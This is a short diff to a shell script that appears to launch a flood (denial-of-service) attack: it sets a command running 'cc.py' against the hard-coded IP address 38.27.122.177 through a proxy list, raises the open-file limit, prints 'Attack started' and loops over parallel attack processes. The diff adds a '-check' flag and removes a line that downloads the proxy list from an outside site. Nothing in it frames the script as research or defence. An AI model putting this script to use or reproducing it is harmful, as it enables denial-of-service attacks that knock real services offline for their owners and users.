@@ -7,7 +7,7 @@
 #
 #the command you want to exec
 
-atk_cmd="python3 cc.py -url http://38.27.122.177 -down -f proxy.txt -v 5"
+atk_cmd="python3 cc.py -url http://38.27.122.177 -down -f proxy.txt -v 5 -check"
 
 pip3 install requests pysocks
 
@@ -17,7 +17,7 @@ process=10
 #change the system limit
 ulimit -n 999999
 
-wget https://proxydisk.netlify.app/proxy.txt
+
 echo Attack started
 for ((i=1;i<=$process;i++))
 do
